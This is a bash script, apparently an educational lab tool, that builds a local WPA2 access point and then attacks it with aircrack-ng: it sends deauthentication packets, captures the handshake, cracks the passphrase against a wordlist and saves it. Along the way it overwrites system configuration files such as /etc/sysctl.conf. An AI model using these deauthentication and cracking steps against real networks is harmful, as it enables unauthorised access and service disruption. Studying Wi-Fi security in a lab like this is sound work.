#!/bin/bash


########################################################################################################################################################
########################################################################################################################################################
######################################################## DECLARING VARIABLES ###########################################################################
########################################################################################################################################################
########################################################################################################################################################


HANDSHAKE_FILE="captured_handshake/handshake_capture-01.cap"
TERMINATED_BY_USER=0
SAVE_HANDSHAKE=0
AIRCRACK_PID=0
CMDLINE_HANDSHAKE=0
INTERRUPTED_DURING_SAVE_PROMPT=0
IN_CRACK_HANDSHAKE_FUNCTION=0
IN_DISCLAIMER=0
HANDSHAKE_CAPTURED=0
SECOND_PROMPT_STATE=0
CREDENTIALS_SAVED_DECISION_MADE=0
INVALID_ARG=0
DO_CLEANUP=1
INTERRUPTED=0


########################################################################################################################################################
########################################################################################################################################################
############################################################# FUNCTIONS ################################################################################
########################################################################################################################################################
########################################################################################################################################################

########################################################################################################################################################
############################################################## CLEANUP ##################################################################################
#######################################m################################################################################################################


cleanup() {
    # Always delete these files
    rm -f captured_handshake/airodump_output.txt
    rm -f captured_handshake/aircrack_output.txt
    rm -f captured_handshake/cleaned_output.txt
    rm -f captured_handshake/output-01.csv
    rm -f captured_handshake/handshake_capture-01.csv
    rm -f captured_handshake/handshake_capture-01.kismet.csv
    rm -f captured_handshake/handshake_capture-01.kismet.netxml
    rm -f captured_handshake/handshake_capture-01.log.csv

    # Conditionally delete the handshake file
    if [ "$DO_CLEANUP" -eq 1 ]; then
        if [ "$CMDLINE_HANDSHAKE" -eq 0 ] && { [ -z "$KEY" ] || [ "$KEY" == "PLACEHOLDER" ]; }; then
            rm -f captured_handshake/handshake_capture-01.cap
        fi
    fi
}


########################################################################################################################################################
############################################################ ERROR EXIT ################################################################################
#######################################m################################################################################################################


error_exit() {
    echo "Error: $1" >&2
    cleanup
    exit 1
}


########################################################################################################################################################
###################################################### PRE-REQUISITE CHECKS ############################################################################
########################################################################################################################################################


pre_requisite_checks(){
# Checking if script is being run as root
if [[ $EUID -ne 0 ]]; then
   error_exit "This script must be run as root"
   exit 1
fi

# Verifying that necessary commands are installed
for cmd in iwconfig grep cut aircrack-ng sed iw; do
    if ! command -v $cmd &> /dev/null; then
        error_exit "$cmd could not be found, please install it."
    fi
done

# Detecting all the wireless interfaces
INTERFACES=$(iw dev | awk '/Interface/ {print $2}')

# Count the number of interfaces
INTERFACE_COUNT=$(echo "$INTERFACES" | wc -l)

if [ "$INTERFACE_COUNT" -lt 2 ]; then
    error_exit "At least 2 wireless interfaces are required but only $INTERFACE_COUNT found."
fi
}


########################################################################################################################################################
###################################################### GET BSSID ############################################################################
########################################################################################################################################################


get_bssid(){
    # Attempt to get the BSSID and SSID using iw dev
    MASTER_INTERFACE=$(iwconfig 2>/dev/null | awk '/^[a-zA-Z0-9]/ {i=$1} /Mode:Master/ {print i}')
    if [ -z "$BSSID" ] || [ -z "$SSID" ]; then
        SSID=$(iw dev | grep -A5 "Interface $MASTER_INTERFACE" | grep 'ssid' | cut -d ' ' -f2-)
        BSSID=$(iw dev | grep -A5 "Interface $MASTER_INTERFACE" | grep 'addr' | cut -d ' ' -f2-)
        CHANNEL=$(iw dev "$MASTER_INTERFACE" info | grep channel | awk '{print $2}')
    fi

    if [ -z "$SSID" ]; then
        echo "Could not determine SSID."
        exit 1
    fi

    if [ -z "$BSSID" ]; then
        echo "Could not determine BSSID. Exiting."
        exit 1
    fi

    if [ -z "$CHANNEL" ]; then
        echo "Could not determine Channel. Exiting."
        exit 1
    fi
}


#########################################################################################################################################################
########################################################### SAVE CREDENTIALS ############################################################################
#########################################################################################################################################################


save_credentials() {
    while true; do
        if [ $INTERRUPTED -eq 1 ]; then
            INTERRUPTED=0
            continue  # This sends us back to the top of the while loop.
        fi

        read -p "Save the network credentials? (Y/N) " SAVE_CHOICE
        case "$SAVE_CHOICE" in
            [Yy]* )
                read -p "Would you like to save the network credentials file as \"$SSID\"? (Y/N) " SAVE_CHOICE_DEFAULT
                case "$SAVE_CHOICE_DEFAULT" in
                    [Yy]* )
                        CREDENTIALS_FILENAME="$SSID.txt"
                        echo "SSID: $SSID" > "saved_credentials/$CREDENTIALS_FILENAME"
                        echo "Passphrase: $KEY" >> "saved_credentials/$CREDENTIALS_FILENAME"
                        echo "Credentials saved with default filename."
                        echo "File saved in saved_credentials/$CREDENTIALS_FILENAME"
                        exit 0  # exit the script
                        ;;
                    [Nn]* )
                        read -p "Please specify the file name for the $SSID network credentials file: " CREDENTIALS_FILENAME || continue
                        if [ -n "$CREDENTIALS_FILENAME" ]; then
                            CREDENTIALS_FILENAME="${CREDENTIALS_FILENAME}.txt"
                            echo "SSID: $SSID" > "saved_credentials/$CREDENTIALS_FILENAME"
                            echo "Passphrase: $KEY" >> "saved_credentials/$CREDENTIALS_FILENAME"
                            echo "File saved in saved_credentials/$CREDENTIALS_FILENAME"
                            exit 0  # Exiting after saving with custom filename
                        else
                            echo "Please enter a valid filename."
                        fi
                        ;;
                    *)
                        echo "Invalid input. Please enter Y/Yes or N/No"
                        ;;
                esac
                ;;
            [Nn]* )
                echo "Network credentials will not be saved."
                exit 0
                return
                ;;
            *)
                echo "Invalid input. Please enter Y/Yes or N/No"
                ;;
        esac
    done
}


#########################################################################################################################################################
########################################################### HANDLE INTERRUPT FUNCTION ###################################################################
#########################################################################################################################################################


handle_interrupt() {
    INTERRUPTED=1  # Set this immediately to indicate interruption

    if [ $IN_DISCLAIMER -eq 1 ]; then
        echo "You interrupted the script during the disclaimer."
        DO_CLEANUP=0
        exit 1
    fi

    if [ $AIRCRACK_PID -ne 0 ]; then
        kill $AIRCRACK_PID 2>/dev/null
        printf "\nAircrack-ng process terminated.\n"
    fi

    if [ $HANDSHAKE_CAPTURED -eq 1 ] && [ -f "$HANDSHAKE_FILE" ] && [ $CMDLINE_HANDSHAKE -eq 0 ] && [ $CREDENTIALS_SAVED_DECISION_MADE -eq 0 ]; then
        while true; do
            printf "Would you like to retain the captured handshake? (Y/N) "
            read -r CHOICE
            case "$CHOICE" in
                [yY]|[yY][eE][sS])
                    SAVE_HANDSHAKE=1
                    DO_CLEANUP=0
                    echo "Handshake will be retained."
                    cleanup
                    exit 0 
                    ;;
                [nN]|[nN][oO])
                    SAVE_HANDSHAKE=0
                    DO_CLEANUP=1
                    echo "Handshake will not be retained."
                    echo -e "Exiting Script"
                    cleanup
                    exit 1
                    ;;
                *)
                    echo "Invalid input. Please enter Y/Yes or N/No."
                    ;;
            esac
        done
    elif [ "$IN_CRACK_HANDSHAKE_FUNCTION" -eq 1 ]; then
        echo -e "\nYou interrupted during the save prompt."
        save_credentials
    else
        echo -e "\nScript interrupted by user."
        exit 1
    fi
}

trap cleanup EXIT
trap handle_interrupt SIGINT


########################################################################################################################################################
###################################################### WIRELESS NETWORK SETUP ##########################################################################
########################################################################################################################################################


wireless_network_setup(){

if [ -f "wifi_setup_done" ]; then
    echo "Wifi-setup has been completed previously. Skipping..."
else
    # Display available wireless interfaces
    echo "Available wireless interfaces:"
    echo "$INTERFACES"

    # Prompt the user to choose a wireless interface
    read -r -p "Enter the wireless interface that will be used for the access point: " INTERFACE

    # Validate that the chosen interface is in the list
    if ! [[ $INTERFACES == *"$INTERFACE"* ]]; then
        error_exit "Invalid interface selected."
    fi

    echo "Wireless interface selected: $INTERFACE"

    # Step 1: Kill Network Manager
    airmon-ng check kill &> /dev/null
    if [[ $? -ne 0 ]]; then
        error_exit "Failed to kill conflicting processes"
    fi
    
    echo "Killing Network Manager"

    # Step 2: Configure Network Interface
    echo "Configuring network interface..."
    cat <<EOF > /etc/network/interfaces
source-directory /etc/network/interfaces.d
auto lo
iface lo inet loopback
allow-hotplug $INTERFACE
iface $INTERFACE inet static
    address 192.168.10.1
    netmask 255.255.255.0
EOF
    systemctl enable networking > /dev/null 2>&1

    # Prompt for SSID and Passphrase
    read -r -p "Create a name for your wireless network: " SSID
    read -r -p "Create a passphrase for your new wireless network: " passphrase

    # Step 3: Create WAP Configuration
    apt install hostapd > /dev/null 2>&1
    echo "Creating hostapd configuration..."
    cat <<EOF > /etc/hostapd/hostapd.conf
interface=$INTERFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=7
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=$passphrase
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF
    systemctl unmask hostapd > /dev/null 2>&1
    systemctl enable hostapd > /dev/null 2>&1

    # Step 4: Configure DNS and DHCP
    apt install dnsmasq > /dev/null 2>&1
    echo "Configuring dnsmasq..."
    cat <<EOF > /etc/dnsmasq.conf
interface=$INTERFACE
dhcp-range=192.168.10.50,192.168.10.150,12h
dhcp-option=3,192.168.10.1
dhcp-option=6,8.8.8.8,8.8.4.4
EOF
    systemctl enable dnsmasq > /dev/null 2>&1

    # Step 5: Enable IPv4 Forwarding
    echo "Enabling IPv4 forwarding..."
    echo "net.ipv4.ip_forward=1" > /etc/sysctl.conf

    # Step 6: Set NAT and Firewall Rules
    echo "Setting up iptables rules..."
    mkdir -p /etc/iptables > /dev/null 2>&1
    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE > /dev/null 2>&1
    iptables -A FORWARD -i eth0 -o $INTERFACE -m state --state RELATED,ESTABLISHED -j ACCEPT > /dev/null 2>&1
    iptables -A FORWARD -i $INTERFACE -o eth0 -j ACCEPT > /dev/null 2>&1
    iptables-save > /etc/iptables/rules.v4 > /dev/null 2>&1

    # Set DEBIAN_FRONTEND to noninteractive to auto-accept prompts
    export DEBIAN_FRONTEND=noninteractive

    # Install iptables-persistent without manual confirmation
    apt-get install -y iptables-persistent > /dev/null 2>&1

    # Reset DEBIAN_FRONTEND to its default value
    unset DEBIAN_FRONTEND

    # Step 7: Enable netfilter-persistent and Reboot
    echo "Enabling netfilter-persistent..."
    systemctl enable netfilter-persistent > /dev/null 2>&1

    # Restart network services
    systemctl restart networking > /dev/null 2>&1
    systemctl restart netfilter-persistent > /dev/null 2>&1
    systemctl restart dnsmasq > /dev/null 2>&1
    systemctl restart hostapd > /dev/null 2>&1
    sysctl net.ipv4.ip_forward=1 > /dev/null 2>&1
    echo "Wireless setup complete."
    echo "The wireless network has been successfully set up" > wifi_setup_done
fi
}


#########################################################################################################################################################
######################################################### CONFIRM CLIENT CONNECTION #####################################################################
#########################################################################################################################################################


confirm_client_connection() {
# Confirm user is connected to the wireless network
while true; do
    read -p "Have you connected to the wireless network $SSID (Y/N)? " CONNECTION_CONFIRM
    case $CONNECTION_CONFIRM in
        [Yy]* )
            echo "Proceeding to wireless network hacking."
            break
            ;;
        [Nn]* )
            echo "Please connect to the wireless network first."
            # No exit here; it will loop again.
            ;;
        * )
            echo "Invalid input. Please enter Y/Yes or N/No."
    esac
done
}


#########################################################################################################################################################
########################################################### CHECK FOR WORDLIST ##########################################################################
#########################################################################################################################################################


check_for_wordlist() {
while true; do
    # Prompt user for wordlist name
    read -p "Name of wordlist: " WORDLIST

    # If wordlist provided by user exists and is readable, break out of the loop
    if [ -f "$WORDLIST" ]; then
        break
    else
        echo "Wordlist file not found or not readable."

        # Check for rockyou.txt in the current directory
        if [ -f "./rockyou.txt" ]; then
            while true; do
                read -p "rockyou.txt was found in the current directory. Would you like to use it as the wordlist? (Y/N): " ROCKYOU_CURRENT_CHOICE
                case $ROCKYOU_CURRENT_CHOICE in
                    [Yy]* )
                        WORDLIST="./rockyou.txt"
                        break 2 # Breaking out of both while loops
                        ;;
                    [Nn]* )
                        break # Just break out of this inner loop
                        ;;
                    * )
                        echo "Invalid input. Please answer with Y or N."
                esac
            done
        fi

        # If rockyou.txt was not found in the current directory, then check in /usr/share/wordlists/
        if [ ! -f "./rockyou.txt" ]; then
            while true; do
                read -p "Would you like to use rockyou.txt from /usr/share/wordlists/ as a wordlist? (Y/N): " ROCKYOU_SHARE_CHOICE
                case $ROCKYOU_SHARE_CHOICE in
                    [Yy]* )
                        if [ -f "/usr/share/wordlists/rockyou.txt" ]; then
                            WORDLIST="/usr/share/wordlists/rockyou.txt"
                            break 2 # Breaking out of both while loops
                        elif [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
                            mv /usr/share/wordlists/rockyou.txt.gz ./
                            gunzip rockyou.txt.gz
                            WORDLIST="./rockyou.txt"
                            break 2
                        else
                            echo "rockyou.txt was not found in /usr/share/wordlists/"
                            break # Break out of this inner loop and continue to the main prompt
                        fi
                        ;;
                    [Nn]* )
                        break # Just break out of this inner loop
                        ;;
                    * )
                        echo "Invalid input. Please answer with Y or N."
                esac
            done
        fi
    fi
done

} 



#########################################################################################################################################################
###################################################### DISPLAY AVAILABLE INTERFACES #####################################################################
#########################################################################################################################################################


display_interfaces() {
    # Display the available wireless interfaces excluding the Master mode interface
    if [[ -z "$MASTER_INTERFACE" ]]; then
        INTERFACES=$(iw dev | grep Interface | awk '{print $2}')
    else
        INTERFACES=$(iw dev | grep Interface | awk '{print $2}' | grep -v "$MASTER_INTERFACE")
    fi

    echo "Available wireless interfaces:"
    echo "$INTERFACES"
}


#########################################################################################################################################################
###################################################### SET INTERFACE IN MONITOR MODE ####################################################################
#########################################################################################################################################################


set_interface_in_monitor_mode(){

# Attempt to get the Master interface using iwconfig
MASTER_INTERFACE=$(iwconfig 2>/dev/null | awk '/^[a-zA-Z0-9]/ {i=$1} /Mode:Master/ {print i}')

# If the MASTER_INTERFACE is empty or not found using iwconfig, then attempt to get it using iw
if [ -z "$MASTER_INTERFACE" ]; then
    MASTER_INTERFACE=$(iw dev | awk '/Interface/ {i=$1} /type AP/ {print i}')
fi

# Validate that an interface was found
if [ -z "$MASTER_INTERFACE" ]; then
    echo "Could not determine Master interface. Exiting."
    exit 1
fi

display_interfaces

while true; do
    # Prompt the user to choose a wireless interface
    read -r -p "Enter the wireless interface that will be used for the wireless network hacking: " INTERFACE1

    # Validate that the chosen interface is in the list
    if [[ $INTERFACES == *"$INTERFACE1"* ]]; then
        echo "Wireless interface selected: $INTERFACE1"
        break # Exit the loop if a valid interface is selected
    else
        echo "Invalid interface selected. Please choose a valid interface from the list."
        display_interfaces # Display the available interfaces again
    fi
done

# Set your wireless interface into monitor mode
airmon-ng start "$INTERFACE1" &> /dev/null
if [[ $? -ne 0 ]]; then
    error_exit "Failed to start monitor mode on $INTERFACE1"
fi

MON_INTERFACE=$(iw dev | grep -A 1 "$INTERFACE1" | grep -Eo 'Interface \S+' | cut -d ' ' -f 2)
if [[ -z "$MON_INTERFACE" ]]; then
    error_exit "Failed to retrieve monitor mode interface"
fi

echo "$INTERFACE1 has entered monitor mode."
}


#########################################################################################################################################################
######################################################## CREATING NECESSARY DIRECTORIES #################################################################
#########################################################################################################################################################


creating_directories(){
[ -d "captured_handshake" ] || mkdir captured_handshake
[ -d "captured_handshake/saved_handshake" ] || mkdir captured_handshake/saved_handshake
[ -d "saved_credentials" ] || mkdir saved_credentials
}


#########################################################################################################################################################
###################################################### LISTEN FOR WPA HANDSHAKE #########################################################################
#########################################################################################################################################################


listen_for_wpa_handshake(){
# Start capturing packets without displaying output
airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w captured_handshake/handshake_capture "$MON_INTERFACE" &> captured_handshake/airodump_output.txt &
if [[ $? -ne 0 ]]; then
    error_exit "Failed to start packet capture with airodump-ng"
fi
AIRODUMP_PID=$!
echo "Airodump-ng is listening for the handshake."

# Give airodump-ng some time to start properly before initiating deauth attack
sleep 10

# Set the wireless interface to the correct channel
iwconfig "$MON_INTERFACE" channel "$CHANNEL"

# Send a single deauthentication packet
aireplay-ng --deauth 1 -a "$BSSID" "$MON_INTERFACE" &> /dev/null
echo "Sent a single deauthentication packet."
if [[ $? -ne 0 ]]; then
    error_exit "Failed to send deauthentication packet with aireplay-ng"
fi

# Wait for 30 seconds before checking for the handshake
sleep 30

# Check if the handshake has been captured
if grep -q "WPA handshake" captured_handshake/airodump_output.txt; then
    echo "WPA handshake captured."
    HANDSHAKE_CAPTURED=1
    SAVE_HANDSHAKE=1
    DO_CLEANUP=0
else
    echo "Handshake not captured."
    aireplay-ng --deauth 5 -a "$BSSID" "$MON_INTERFACE" &> /dev/null
    echo "Sent 5 deauthentication packets."

    # Wait for 60 seconds before checking for the handshake again
    sleep 60

    # Check if the handshake has been captured
    if grep -q "WPA handshake" captured_handshake/airodump_output.txt; then
        echo "WPA handshake captured."
        HANDSHAKE_CAPTURED=1
        SAVE_HANDSHAKE=1
        DO_CLEANUP=0
    else
        # Enter a loop where it keeps checking for the handshake at 60-second intervals
        while :; do
            echo "Handshake not captured, listening for handshake..."

            # Wait for 60 seconds before checking for the handshake
            sleep 60

            # Check if the handshake has been captured
            if grep -q "WPA handshake" captured_handshake/airodump_output.txt; then
                echo "WPA handshake captured."
                HANDSHAKE_CAPTURED=1
                SAVE_HANDSHAKE=1
                DO_CLEANUP=0
                break
            fi
        done
    fi
fi

# Stop the airodump-ng process
pkill -P $AIRODUMP_PID
}


#########################################################################################################################################################
###################################################### HANDSHAKE CRACKING ###############################################################################
#########################################################################################################################################################


crack_handshake_and_process_output() {
    IN_CRACK_HANDSHAKE_FUNCTION=0

# Attempt to get the BSSID and SSID using iw dev
    get_bssid

    echo "Aircrack-ng is cracking handshake."
    aircrack-ng -a2 -b "$BSSID" -w "$WORDLIST" "$HANDSHAKE_FILE" &> captured_handshake/aircrack_output.txt &
    AIRCRACK_PID=$!
    wait $AIRCRACK_PID
    AIRCRACK_PID=0

    sed 's/\x1B\[[0-9;]*[a-zA-Z]//g' captured_handshake/aircrack_output.txt > captured_handshake/cleaned_output.txt

    # Check for missing EAPOL data
    if grep -q "Packets contained no EAPOL data" captured_handshake/cleaned_output.txt; then
        printf "The capture file does not contain a valid WPA handshake. Please capture the handshake again."
        rm captured_handshake/handshake_capture-01.cap
        exit 1
    fi

    KEY=$(grep "KEY FOUND" captured_handshake/cleaned_output.txt | head -n 1 | cut -d '[' -f 2 | cut -d ']' -f 1)
    if [ -n "$KEY" ]; then
        IN_CRACK_HANDSHAKE_FUNCTION=1
    fi

    if [ -z "$KEY" ]; then
        printf "The passphrase was not found in the wordlist. Try another wordlist."
        SAVE_HANDSHAKE=1
        DO_CLEANUP=0
        exit 1
    else
        echo "Key Found: $KEY"
        if [ "$CMDLINE_HANDSHAKE" -eq 0 ]; then
            rm -f captured_handshake/handshake*
        fi
        save_credentials
    fi
    IN_CRACK_HANDSHAKE_FUNCTION=0
}


########################################################################################################################################################
############################################################## END MONITOR MODE ########################################################################
########################################################################################################################################################


end_monitor_mode(){
airmon-ng stop "$MON_INTERFACE" &> /dev/null
if [[ $? -ne 0 ]]; then
    error_exit "Failed to stop monitor mode on $MON_INTERFACE"
fi
}


########################################################################################################################################################
#################################################### CAPTURE NEW HANDSHAKE #############################################################################
########################################################################################################################################################


capture_new_handshake(){

# Attempt to get the BSSID and SSID using iw dev
echo "Started capture_new_handshake"
get_bssid
confirm_client_connection
check_for_wordlist
set_interface_in_monitor_mode
listen_for_wpa_handshake
crack_handshake_and_process_output
}


########################################################################################################################################################
#################################################### ASK TO CAPTURE NEW HANDSHAKE ######################################################################
########################################################################################################################################################


ask_to_capture_new_handshake() {
    while true; do
        printf "Would you like to capture a new WPA handshake? (Y/N) "
        read -r CAPTURE_RESPONSE
        case "$CAPTURE_RESPONSE" in
            [yY][eE][sS]|[yY])
                capture_new_handshake
                break
                ;;
            [nN]|[nN][oO])
                echo "Exiting."
                exit 0
                ;;
            *)
                echo "Invalid input. Please enter Y/Yes or N/No."
                ;;
        esac
    done
}


########################################################################################################################################################
############################################# CHECK FOR EXISTING HANDSHAKE #############################################################################
########################################################################################################################################################


check_for_existing_handshake(){
if [ -f "captured_handshake/handshake_capture-01.cap" ]; then

# Attempt to get the BSSID and SSID using iw dev
get_bssid
    SAVE_HANDSHAKE=1
    DO_CLEANUP=0
    while true; do
        printf "You've already captured a WPA handshake! Would you like to proceed to cracking the handshake? (Y/N) "
        read -r RESPONSE
        case "$RESPONSE" in
            [yY][eE][sS]|[yY])
                SAVE_HANDSHAKE=1
                DO_CLEANUP=0
                # Prompt to enter the wordlist
                check_for_wordlist
                crack_handshake_and_process_output
                exit 0
                ;;
            [nN]|[nN][oO])
                while true; do
                    printf "Would you like to save the handshake file, or delete it? (save/del) "
                    read -r HANDSHAKE_CHOICE
                    case "$HANDSHAKE_CHOICE" in
                        save)
                            read -r -p "Enter the new filename for the handshake: " NEW_FILENAME
                            mv captured_handshake/handshake_capture-01.cap "captured_handshake/saved_handshake/$NEW_FILENAME"
                            rm -f captured_handshake/handshake_capture-01.csv captured_handshake/handshake_capture-01.kismet.netxml captured_handshake/handshake_capture-01.kismet.csv captured_handshake/handshake_capture-01.log.csv
                            echo "Handshake saved in captured_handshake/saved_handshake"
                            echo "To show saved handshakes: sudo bash <script name> handshakes"
                            DO_CLEANUP=1
                            ask_to_capture_new_handshake
                            ;;
                        del)
                            rm -f captured_handshake/handshake_capture-01.csv captured_handshake/handshake_capture-01.kismet.netxml captured_handshake/handshake_capture-01.cap captured_handshake/handshake_capture-01.kismet.csv captured_handshake/handshake_capture-01.log.csv
                            echo "Handshake file deleted."
                            ask_to_capture_new_handshake
                            ;;
                        *)
                            echo "Invalid input. Please enter 'save' or 'del'."
                            ;;
                    esac
                done
                ;;
            *)
                echo "Invalid input. Please enter Y/Yes or N/No."
                ;;
        esac
    done
fi
}


#######################################################################################################################################################
############################################################# DISCLAIMER ##############################################################################
#######################################################################################################################################################


IN_DISCLAIMER=1

echo -e "\033[0;34mDISCLAIMER\033[0m"
echo "The scripts available in this GitHub repository are designed to automate functions of the aircrack-ng suite. Their primary intent is for educational purposes and legal, ethical use, specifically to facilitate security assessments of wireless networks to which you have explicit authorization."
echo ""
echo -e "\033[0;34mDEFINITIONS:\033[0m"
echo "'Ethical Use' refers to the use of these scripts in manners that do not harm, exploit, or intrude on the privacy or rights of others."
echo "'Legal Authorization' refers to having explicit permission from the rightful owner or administrator of the wireless network to conduct security assessments using these scripts."
echo ""
echo -e "1. \033[0;34mLEGAL USE ONLY:\033[0m These scripts must only be employed on networks where you have explicit legal authorization. Unauthorized access to wireless networks is illegal and punishable by law. Comply with all local, state, and international laws when using these scripts."
echo -e "2. \033[0;34mEDUCATIONAL PURPOSE:\033[0m These scripts are shared with an educational objective, aimed at helping individuals to understand wireless network security and protect their own networks through legal and ethical hacking practices."
echo -e "3. \033[0;34mNO WARRANTY:\033[0m These scripts are provided \"as is,\" without any guarantees. The creator disclaims any liabilities or damages that might arise from the use or misuse of these scripts."
echo -e "4. \033[0;34mRESPONSIBLE REPORTING:\033[0m If your use of these scripts uncovers vulnerabilities, you are encouraged to report these findings responsibly to the appropriate parties to enhance network security rather than exploiting them for malicious purposes."
echo -e "5. \033[0;34mMODIFICATION:\033[0m Users are allowed to modify the scripts but must retain this disclaimer and any original attribution. Distributing or selling these scripts without explicit permission from the creator is prohibited."
echo -e "6. \033[0;34mJURISDICTION:\033[0m Users are responsible for understanding and adhering to all laws and regulations in their respective countries or regions."
echo -e "7. \033[0;34mINDEMNIFICATION:\033[0m Users agree to indemnify the creator against any claims, losses, or damages resulting from their use or misuse of these scripts."
echo -e "8. \033[0;34mLIMITATION OF LIABILITY:\033[0m In no event shall the creator be liable for any damages whatsoever resulting from the use or inability to use these scripts."
echo -e "9. \033[0;34mOPEN SOURCE LICENSE:\033[0m These scripts are open source under the GNU Affero General Public License v3.0. Users must comply with the terms of this license in all uses of the scripts."
echo -e "10. \033[0;34mREVISION DATE:\033[0m This disclaimer was last updated on October 1, 2023."
echo ""
echo "By accessing, downloading, or using these scripts, you affirm that you have read, understood, and agreed to these terms. If not in agreement, refrain from using these scripts."
echo""
echo "The creator reserves the right to update or modify this disclaimer without prior notice."

while true; do
    echo -e "\033[0;31mDo you agree with the terms of use? (Y/N):\033[0m"
    read -r response

    case $response in
        [Yy]* )
            echo "You agreed to the terms of use."
            # Continue the rest of the script.
            break
            ;;
        [Nn]* )
            echo "You did not agree to the terms of use. Exiting."
            exit 1
            ;;
        * )
            echo "Invalid input. Please enter Y/Yes or N/No."
    esac
done

# After the disclaimer, reset the flag
IN_DISCLAIMER=0


########################################################################################################################################################
####################################################### PROCESS COMMAND LINE ARGUMENTS #################################################################
########################################################################################################################################################


if [ "$#" -eq 0 ]; then
    :
elif [ "$1" == "--help" ]; then
    echo "Usage:"
    echo "sudo bash <script name> handshakes"
    echo "     # Show saved handshakes (in captured_handshakes/saved_handshakes)"
    echo "     # Note: Directories will not exist until the script is started successfully."
    echo ""
    echo "sudo bash <script name> <handshake file name>"
    echo "     # Starts aircrack-ng using saved handshake"
    echo ""
    echo "Help:"
    echo "Temporary files are stored in captured_handshakes."
    echo "Saved credentials are stored in saved_credentials."
    DO_CLEANUP=0
    exit 0
elif [ "$1" == "handshakes" ]; then
    # List the handshakes in the 'captured_handshake' directory
    echo ""
    echo "Saved Handshakes:"
    ls captured_handshake/saved_handshake
    echo ""
    echo "To reattempt a handshake: sudo bash <script name> <handshake file name>"
    DO_CLEANUP=0
    exit 0
elif [ -f "captured_handshake/saved_handshake/$1" ]; then
    CMDLINE_HANDSHAKE=1
    HANDSHAKE_FILE="captured_handshake/saved_handshake/$1"
    # Prompt to input the wordlist
    check_for_wordlist
    # Aircrack-ng handshake crack
    crack_handshake_and_process_output "$HANDSHAKE_FILE" true
    exit 0
else
    echo "Invalid argument. Please specify either 'handshakes' or provide a handshake file name."
    echo ""
    echo "Usage:"
    echo "sudo bash <script name> handshakes"
    echo "     # Displays saved handshakes (in captured_handshakes/saved_handshakes)"
    echo "     # Note: Directories will not exist until the script is started successfully."
    echo ""
    echo "sudo bash <script name> <handshake file name>"
    echo "     # Starts aircrack-ng using saved handshake"
    INVALID_ARG=1
fi

if [ "$INVALID_ARG" -eq 1 ]; then
    trap - EXIT  # Remove the exit trap which calls cleanup
    exit 1
fi


########################################################################################################################################################
########################################################################################################################################################
######################################################### FUNCTION EXECUTION ###########################################################################
########################################################################################################################################################
########################################################################################################################################################


# Pre requisite checks
pre_requisite_checks

# Creating necessary directories
creating_directories

# Check for existing handshake
check_for_existing_handshake

# Wireless network setup
wireless_network_setup

# Get the BSSID
get_bssid

# Confirm Client Connection
confirm_client_connection

# Check for the wordlist
check_for_wordlist

# Set interface in monitor mode
set_interface_in_monitor_mode

# Listen for the WPA handshake
listen_for_wpa_handshake

# Crack the handshake
crack_handshake_and_process_output

# Take interface out of monitor mode
end_monitor_mode
